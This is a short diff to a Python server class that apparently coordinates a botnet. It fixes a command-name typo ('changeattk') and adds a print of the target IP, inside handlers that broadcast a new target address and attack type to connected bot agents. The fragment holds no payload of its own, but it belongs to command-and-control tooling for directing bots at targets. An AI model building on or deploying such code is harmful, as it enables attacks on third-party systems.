@@ -109,7 +109,7 @@ class Server():
     def _master_handler(self, sock: socket.socket, type: str, body: str) -> None:
         if type == 'listbot':
             if len(self.bot_agents) == 0:
-                response = 'listbot: '
+                response = 'listbot:'
             else:
                 list_bot = ''
                 for bot in self.bot_agents:
@@ -119,8 +119,9 @@ class Server():
             # TODO: check if valid ip/address
             self._bot_broadcast(f'changeip:{body}'.encode(ENCODING))
             self.target_address = body
+            print(f'Target IP is: {self.target_address}')               # Reflects change in target IP
             return
-        elif type == 'changattk':
+        elif type == 'changeattk':
             # TODO: check if valid attack
             self._bot_broadcast(f'changeattk:{body}'.encode(ENCODING))
             self.attk_type = body
